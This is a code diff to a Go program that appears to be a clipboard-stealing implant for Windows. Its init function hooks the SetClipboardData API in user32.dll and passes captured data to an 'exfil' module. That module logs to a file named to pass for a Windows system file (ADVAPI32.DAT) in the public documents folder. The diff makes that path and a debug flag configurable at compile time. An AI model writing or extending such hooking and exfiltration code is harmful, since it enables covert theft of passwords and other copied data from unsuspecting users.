@@ -24,6 +24,12 @@ import (
 	"golang.org/x/sys/windows"
 )
 
+// variables can be overwridden at compile time
+var (
+	debug   = "false"
+	logpath = "c:\\users\\public\\documents\\ADVAPI32.DAT"
+)
+
 // get the name of the process
 func procName() (string, error) {
 	exeName := make([]uint16, 1024)
@@ -31,7 +37,6 @@ func procName() (string, error) {
 	if err := windows.QueryFullProcessImageName(windows.CurrentProcess(), 0, &exeName[0], &execNameLen); err != nil {
 		return "", err
 	}
-
 	return windows.UTF16ToString(exeName), nil
 }
 
@@ -39,7 +44,9 @@ func procName() (string, error) {
 func init() {
 	modUser32 := windows.NewLazySystemDLL("user32.dll")
 	procSetClipboardData := modUser32.NewProc("SetClipboardData")
-
+	if debug == "true" {
+		winhook.DebugEnabled = true
+	}
 	trampolineFunc, err := winhook.InstallHook64(procSetClipboardData.Addr(), uintptr(unsafe.Pointer(C.SetClipboardDataGateway)), 5)
 	if err != nil {
 		return
@@ -50,8 +57,8 @@ func init() {
 		// if we can't get the proc name just continue with unknown
 		target = "UNKNOWN"
 	}
-	// all went well setup exfil, setup the log file as something that looks windows internal
-	exfil.Initialize(target, "c:\\users\\public\\documents\\AVDAPI.DAT")
+	// all went well setup exfil, setup the log file path
+	exfil.Initialize(target, logpath)
 }
 
 func main() {
